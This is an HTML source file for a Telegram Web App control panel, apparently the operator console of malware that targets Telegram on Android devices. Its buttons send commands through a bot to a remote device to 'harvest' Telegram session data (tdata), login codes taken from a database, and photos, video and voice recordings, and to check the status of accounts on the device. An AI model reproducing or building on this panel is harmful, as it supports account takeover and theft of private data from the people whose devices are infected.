<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Wolzer Control</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg: var(--tg-theme-bg-color, #0e0e10);
      --fg: var(--tg-theme-text-color, #f2f2f2);
      --hint: var(--tg-theme-hint-color, #8a8a8e);
      --btn: var(--tg-theme-button-color, #2aabee);
      --btn-fg: var(--tg-theme-button-text-color, #fff);
      --sec: var(--tg-theme-secondary-bg-color, #1c1c1e);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: var(--bg);
      color: var(--fg);
      min-height: 100vh;
      padding: 16px;
      padding-bottom: 32px;
    }
    h1 { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
    .sub { color: var(--hint); font-size: 13px; margin-bottom: 20px; }
    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }
    button.cmd {
      background: var(--sec);
      color: var(--fg);
      border: none;
      border-radius: 12px;
      padding: 16px 12px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      text-align: left;
      transition: opacity .15s;
    }
    button.cmd:active { opacity: .7; }
    button.cmd strong { display: block; font-size: 15px; margin-bottom: 2px; }
    button.cmd span { color: var(--hint); font-size: 11px; font-weight: 400; }
    button.primary {
      grid-column: 1 / -1;
      background: var(--btn);
      color: var(--btn-fg);
      text-align: center;
    }
    button.primary strong { color: var(--btn-fg); }
    button.primary span { color: rgba(255,255,255,.75); }
    .log {
      margin-top: 20px;
      background: var(--sec);
      border-radius: 12px;
      padding: 12px;
      font-size: 12px;
      color: var(--hint);
      min-height: 48px;
      font-family: ui-monospace, monospace;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .row-full { grid-column: 1 / -1; }
  </style>
</head>
<body>
  <h1>Wolzer Session</h1>
  <p class="sub">команды уходят на устройство через бота</p>

  <div class="grid">
    <button class="cmd primary" data-cmd="harvest">
      <strong>Full harvest</strong>
      <span>media + codes + tdata</span>
    </button>
    <button class="cmd" data-cmd="tdata">
      <strong>Tdata only</strong>
      <span>чистый android pack</span>
    </button>
    <button class="cmd" data-cmd="media">
      <strong>Media</strong>
      <span>photo / video / voice</span>
    </button>
    <button class="cmd" data-cmd="codes">
      <strong>Codes</strong>
      <span>login codes из db</span>
    </button>
    <button class="cmd" data-cmd="status">
      <strong>Status</strong>
      <span>accounts / tgnet / device</span>
    </button>
    <button class="cmd" data-cmd="ping">
      <strong>Ping</strong>
      <span>проверка канала</span>
    </button>
    <button class="cmd" data-cmd="stop">
      <strong>Stop</strong>
      <span>сбросить флаг</span>
    </button>
    <button class="cmd row-full" data-cmd="help">
      <strong>Help</strong>
      <span>список команд</span>
    </button>
  </div>
  <div class="log" id="log">ready</div>
  <script>
    const tg = window.Telegram && window.Telegram.WebApp;
    if (tg) { tg.ready(); tg.expand(); try { tg.setHeaderColor("secondary_bg_color"); } catch (e) {} }
    const log = document.getElementById("log");
    function setLog(t) { log.textContent = t; }
    function send(cmd) {
      const payload = "!" + cmd;
      setLog("send → " + payload);
      if (tg && tg.sendData) {
        try { tg.sendData(payload); setLog("sent: " + payload + "\nзакрой webapp — ответ придёт в чат"); }
        catch (e) { setLog("sendData error: " + e); }
      } else { setLog("Telegram.WebApp недоступен\nоткрой панель из бота"); }
    }
    document.querySelectorAll("button.cmd").forEach(btn => {
      btn.addEventListener("click", () => send(btn.dataset.cmd));
    });
  </script>
</body>
</html>
